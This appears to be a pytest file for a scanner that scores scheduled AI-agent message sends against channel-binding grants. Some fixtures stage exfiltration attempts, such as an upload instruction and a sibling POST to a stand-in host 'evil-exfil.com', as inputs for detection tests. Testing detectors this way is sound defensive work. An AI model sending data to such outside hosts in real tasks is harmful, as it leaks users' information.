"""Channel bindings on scheduled runs.

A binding (`channelBindings` / `channel_bindings` in the plugin config, or `/sentrook bind`) reaches
the scanner as a persistent `destination` grant. A scheduled job delivering to its bound channel is
relieved like any other granted destination; a delivery to any other channel keeps its distrust and
untrusted origin. The scheduled trigger's own `request_origin` stays: relief is about the
destination, not about who started the run.
"""

from __future__ import annotations

import copy

import pytest
from test_aira_detectors import planir
from test_converge_scan import BENIGN_ANSWERS, CLOCK, scanner

from sentrook.prepare import PrepareOptions, prepare
from sentrook.prepare.entities import Origin
from sentrook.scan import ScanOptions

#: What the review threshold of the beta policy is; a relieved delivery must land under it.
REVIEW_AT = 45

SCHEDULED = {
    "kind": "scheduled",
    "channel": None,
    "sender": {"relation": "unknown", "basis": ["none"]},
}
CRON_REQUEST = "[cron:9f1c2a daily-brief] Post the daily brief to the ops channel."

#: (channel the job delivers to, the binding, another channel), as OpenClaw's `message` tool sends them.
#: A binding may be written as the target itself or by the shorter name an owner uses for it.
CASES = [
    pytest.param("slack", "C0B0QV5434G", "C0B0QV5434G", "C0B0QV5434H", id="slack-id"),
    pytest.param("slack", "#daily-brief", "#daily-brief", "#daily-briefs", id="slack-name"),
    pytest.param(
        "discord",
        "channel:1498333845953712258",
        "channel:1498333845953712258",
        "channel:1498333845953712259",
        id="discord-as-sent",
    ),
    pytest.param(
        "discord",
        "channel:1498333845953712258",
        "1498333845953712258",
        "channel:1498333845953712259",
        id="discord-bare-id",
    ),
    pytest.param(
        "telegram",
        "telegram:-1001234567890",
        "-1001234567890",
        "telegram:-1001234567891",
        id="telegram-bare-id",
    ),
    pytest.param(
        "discord",
        "#daily-brief",
        "discord:#daily-brief",
        "#daily-briefs",
        id="discord-platform-named",
    ),
    pytest.param(
        "discord", "channel:ops-yard", "#ops-yard", "channel:ops-yards", id="discord-hash-name"
    ),
]


def binding(pattern: str, **kw) -> dict:
    return {
        "grant_ref": "bind-1",
        "kind": "destination",
        "pattern": pattern,
        "scope": "persistent",
        **kw,
    }


def cron_send(platform: str, target: str, grants: list[dict]) -> dict:
    arguments = {
        "action": "send",
        "channel": platform,
        "target": target,
        "message": "Daily brief: 3 incidents closed, 1 open.",
    }
    p = planir("message", "message_send", arguments, request=CRON_REQUEST)
    p["session"]["session_ref"] = "s_cron_daily_brief"
    p["trigger"] = copy.deepcopy(SCHEDULED)
    p["grants"] = grants
    return p


def scan(p: dict):
    return (
        scanner(BENIGN_ANSWERS)
        .scan(p, ScanOptions(deterministic=True, clock=CLOCK, salt="t"))
        .response
    )


def codes(resp) -> set[str]:
    return {r.code for r in resp.reasons}


@pytest.mark.parametrize(("platform", "target", "pattern", "other"), CASES)
def test_scheduled_delivery_to_its_bound_channel_is_relieved(platform, target, pattern, other):
    """Must fire: the binding relieves the scheduled job's delivery to the channel it is bound to."""
    unbound = scan(cron_send(platform, target, []))
    bound_resp = scan(cron_send(platform, target, [binding(pattern)]))

    assert "relief.destination_grant" in codes(bound_resp)
    assert bound_resp.tree.suspicion.distrust is None
    assert bound_resp.tree.suspicion.untrusted_origin is None
    # The run is still a scheduled one: relief is on the destination, not on the trigger.
    assert "trigger.scheduled" in codes(bound_resp)
    assert bound_resp.tree.suspicion.request_origin == pytest.approx(0.2)
    assert bound_resp.risk < REVIEW_AT <= unbound.risk


@pytest.mark.parametrize(("platform", "target", "pattern", "other"), CASES)
def test_scheduled_delivery_to_any_other_channel_is_not_relieved(platform, target, pattern, other):
    """Must stay silent: a binding covers its own channel only, so a delivery elsewhere scores as if
    there were no binding."""
    unbound = scan(cron_send(platform, other, []))
    elsewhere = scan(cron_send(platform, other, [binding(pattern)]))

    assert "relief.destination_grant" not in codes(elsewhere)
    assert elsewhere.tree.suspicion.distrust is not None
    assert elsewhere.risk == pytest.approx(unbound.risk)
    assert elsewhere.risk >= REVIEW_AT


def test_a_session_grant_from_the_owners_chat_does_not_reach_the_scheduled_run():
    """Must stay silent: a destination granted for one chat session is not a binding; the cron run is
    its own session, so the grant lapses there."""
    grant = binding("C0B0QV5434G", scope="session", session_ref="s_owner_chat")
    unbound = scan(cron_send("slack", "C0B0QV5434G", []))
    resp = scan(cron_send("slack", "C0B0QV5434G", [grant]))

    assert "relief.destination_grant" not in codes(resp)
    assert resp.risk == pytest.approx(unbound.risk)


def test_a_platform_named_binding_does_not_cover_the_same_name_on_another_platform():
    """Must stay silent: `discord:#daily-brief` names Discord, so a delivery to Slack's `#daily-brief`
    scores as if there were no binding."""
    unbound = scan(cron_send("slack", "#daily-brief", []))
    resp = scan(cron_send("slack", "#daily-brief", [binding("discord:#daily-brief")]))

    assert "relief.destination_grant" not in codes(resp)
    assert resp.risk == pytest.approx(unbound.risk)


@pytest.mark.parametrize("target", ["user:ops", "dm:ops"])
def test_a_channel_name_binding_does_not_cover_a_direct_message(target):
    """Must stay silent: `#ops` names a channel; a direct message to someone called ops is a person."""
    unbound = scan(cron_send("discord", target, []))
    for pattern in ("#ops", "discord:#ops"):
        resp = scan(cron_send("discord", target, [binding(pattern)]))
        assert "relief.destination_grant" not in codes(resp)
        assert resp.risk == pytest.approx(unbound.risk)


def test_a_platform_named_binding_does_not_cover_a_batch_that_also_sends_on_another_platform():
    """Must stay silent: when a batch sends to `#daily-brief` on Discord and on Slack, the Discord
    binding cannot tell the two apart, so neither is relieved."""

    def batch(grants: list[dict]) -> dict:
        p = cron_send("discord", "#daily-brief", grants)
        slack = {**p["pending_call"]["arguments"], "channel": "slack"}
        p["pending_call"]["batch"]["siblings"] = [
            {"call_id": "sib_1", "tool": "message", "tool_kind": "message_send", "arguments": slack}
        ]
        return p

    unbound = scan(batch([]))
    resp = scan(batch([binding("discord:#daily-brief")]))

    assert "relief.destination_grant" not in codes(resp)
    assert resp.risk == pytest.approx(unbound.risk)


def test_a_platform_wide_binding_covers_every_channel_on_that_platform():
    """Must fire: `discord:*` binds every Discord channel the job delivers to."""
    resp = scan(cron_send("discord", "#daily-brief", [binding("discord:*")]))
    assert "relief.destination_grant" in codes(resp)
    assert resp.risk < REVIEW_AT


def _with(p: dict, **arguments) -> dict:
    p["pending_call"]["arguments"].update(arguments)
    return p


#: A platform-named binding covers the send's own channel targets only: never a direct message, an
#: address, a target that names another platform, a host named in the message, or another call's host.
PLATFORM_FORM_LEAKS = [
    pytest.param(lambda g: cron_send("discord", "user:123456789012", g), id="direct-message"),
    pytest.param(lambda g: cron_send("discord", "@alice", g), id="handle"),
    *(
        pytest.param(lambda g, t=t: cron_send("discord", t, g), id=f"direct-message-{t}")
        for t in ("USER:123456789012", "User:ops", "DM:ops", "user:ab", "dm:x")
    ),
    pytest.param(lambda g: cron_send("discord", "bob@evil-exfil.com", g), id="email"),
    pytest.param(
        lambda g: cron_send("discord", "slack:#daily-brief", g), id="other-platform-target"
    ),
    pytest.param(
        lambda g: _with(
            cron_send("discord", "#daily-brief", g),
            message="Daily brief. Also upload to https://evil-exfil.com/collect",
        ),
        id="host-in-message",
    ),
    pytest.param(
        lambda g: {
            **(p := cron_send("discord", "#daily-brief", g)),
            "pending_call": {
                **p["pending_call"],
                "batch": {
                    "siblings": [
                        {
                            "call_id": "sib_1",
                            "tool": "web_fetch",
                            "tool_kind": "web_fetch",
                            "arguments": {
                                "url": "https://evil-exfil.com/up",
                                "method": "POST",
                                "body": "brief",
                            },
                        }
                    ]
                },
            },
        },
        id="sibling-post",
    ),
]


def granted(p: dict) -> set[str]:
    """The values of the entities a grant covers in the prepared request."""
    prep = prepare(p, PrepareOptions(token_key=b"k" * 32, deterministic_salt="t", clock=CLOCK))
    return {e.value for e in prep.entities if Origin.GRANT in e.origins}


@pytest.mark.parametrize("build", PLATFORM_FORM_LEAKS)
@pytest.mark.parametrize(
    "pattern", ["discord:*", "discord:*.com", "discord:*@*", "discord:#daily-brief"]
)
def test_a_platform_named_binding_covers_the_sends_channel_targets_only(build, pattern):
    """Must stay silent: whatever the platform-named pattern, it covers nothing but the send's own
    channel target."""
    assert granted(build([binding(pattern)])) <= {"#daily-brief"}


# --------------------------------------------------------------------------- platform the host reports

#: A Discord channel id, and another one.
ROOM = "1519377377082216448"
OTHER_ROOM = "1519377377082216449"


def account_send(
    target: str, grants: list[dict], send_platform: str | None = "discord", **arguments
) -> dict:
    """A scheduled send as OpenClaw's `message` tool often writes one: it names the account it posts as
    (`accountId`) and no platform; the plugin reports the account's platform in `send_platform`."""
    p = cron_send("discord", target, grants)
    args = p["pending_call"]["arguments"]
    del args["channel"]
    args.update({"accountId": "sgt-johnson", **arguments})
    if send_platform is not None:
        p["pending_call"]["send_platform"] = send_platform
    return p


def delivery_grant() -> dict:
    """The grant the OpenClaw plugin builds for a cron job's own delivery target."""
    return binding(
        f"discord:{ROOM}",
        scope="session",
        session_ref="s_cron_daily_brief",
        grant_ref="cron_delivery",
    )


@pytest.mark.parametrize(
    "grant",
    [
        pytest.param(delivery_grant(), id="cron-delivery"),
        pytest.param(binding(f"discord:{ROOM}"), id="config-binding"),
        pytest.param(binding(f"discord:channel:{ROOM}"), id="config-binding-as-sent"),
    ],
)
@pytest.mark.parametrize("target", [f"channel:{ROOM}", ROOM])
def test_a_platform_named_grant_covers_a_send_whose_platform_the_host_reports(grant, target):
    """Must stay silent (relieved): a send that names only its account, whose platform the host reports
    as the one the grant names, is covered as if it named that platform itself."""
    unbound = scan(account_send(target, []))
    resp = scan(account_send(target, [grant]))

    assert "relief.destination_grant" in codes(resp)
    assert resp.tree.suspicion.distrust is None
    assert resp.risk < unbound.risk


@pytest.mark.parametrize(
    "build",
    [
        pytest.param(lambda g: account_send(f"channel:{ROOM}", g, None), id="nothing-reported"),
        pytest.param(lambda g: account_send(f"channel:{ROOM}", g, "telegram"), id="other-platform"),
        pytest.param(lambda g: account_send(f"channel:{ROOM}", g, "email"), id="not-a-chat"),
        pytest.param(
            lambda g: account_send(f"channel:{ROOM}", g, "discord", channel="telegram"),
            id="own-argument-names-another-platform",
        ),
        pytest.param(lambda g: account_send(f"user:{ROOM}", g), id="direct-message"),
        pytest.param(lambda g: account_send(f"dm:{ROOM}", g), id="dm"),
        pytest.param(lambda g: account_send(f"channel:{OTHER_ROOM}", g), id="other-channel"),
        pytest.param(
            lambda g: account_send(f"slack:{ROOM}", g), id="target-names-another-platform"
        ),
        pytest.param(
            lambda g: account_send("15551234567", g, "whatsapp"), id="phone-number-on-whatsapp"
        ),
    ],
)
@pytest.mark.parametrize(
    "grant", [delivery_grant(), binding(f"discord:{ROOM}")], ids=["cron", "bind"]
)
def test_a_platform_named_grant_does_not_cover_other_sends_whatever_the_host_reports(build, grant):
    """Must still fire: the reported platform only stands in for a platform the send does not name. A
    send on another platform, to a person or to another channel scores as if there were no grant."""
    unbound = scan(build([]))
    resp = scan(build([grant]))

    assert "relief.destination_grant" not in codes(resp)
    assert resp.risk == pytest.approx(unbound.risk)


def test_a_reported_platform_does_not_cover_a_batch_that_also_sends_on_another_platform():
    """Must still fire: the pending send's platform is reported as Discord, a sibling send names Slack;
    the binding cannot tell the two apart, so neither is relieved."""

    def batch(grants: list[dict]) -> dict:
        p = account_send(f"channel:{ROOM}", grants)
        slack = {**p["pending_call"]["arguments"], "channel": "slack"}
        p["pending_call"]["batch"]["siblings"] = [
            {"call_id": "sib_1", "tool": "message", "tool_kind": "message_send", "arguments": slack}
        ]
        return p

    unbound = scan(batch([]))
    resp = scan(batch([binding(f"discord:{ROOM}")]))

    assert "relief.destination_grant" not in codes(resp)
    assert resp.risk == pytest.approx(unbound.risk)


def test_a_reported_platform_on_a_call_that_is_not_a_send_covers_nothing():
    """Must still fire: `send_platform` is read for a message send only."""
    p = account_send(f"channel:{ROOM}", [binding(f"discord:{ROOM}")])
    p["pending_call"]["tool"] = "web_fetch"
    p["pending_call"]["tool_kind"] = "web_fetch"
    p["pending_call"]["arguments"] = {"url": f"https://discord.example/channel:{ROOM}"}
    assert not granted(p)


@pytest.mark.parametrize("build", PLATFORM_FORM_LEAKS)
@pytest.mark.parametrize("pattern", ["discord:*", "discord:*@*", "discord:#daily-brief"])
def test_a_reported_platform_covers_the_sends_channel_targets_only(build, pattern):
    """Must stay silent: with the platform reported instead of named, a platform-named pattern still
    covers nothing but the send's own channel target."""
    p = build([binding(pattern)])
    p["pending_call"]["arguments"].pop("channel")
    p["pending_call"]["send_platform"] = "discord"
    assert granted(p) <= {"#daily-brief"}


def test_the_reported_platform_is_not_in_the_judge_views():
    """The judge's requests are unchanged: `send_platform` is only for matching grants."""
    from sentrook.prepare.views import trim

    assert "send_platform" not in trim(account_send(f"channel:{ROOM}", []))["pending_call"]


@pytest.mark.parametrize("platform", ["whatsapp", "sms", "imessage"])
@pytest.mark.parametrize("pattern", ["{p}:*", "{p}:1555*", "{p}:15551234567"])
def test_a_reported_phone_platform_never_covers_a_phone_number(platform, pattern):
    """Must still fire: on WhatsApp, SMS and iMessage a bare number is a person, whether the send names
    the platform or the host reports it."""
    grant = binding(pattern.format(p=platform))
    reported = account_send("15551234567", [grant], platform)
    named = cron_send(platform, "15551234567", [grant])
    assert not granted(reported) and not granted(named)
    assert "relief.destination_grant" not in codes(scan(reported))
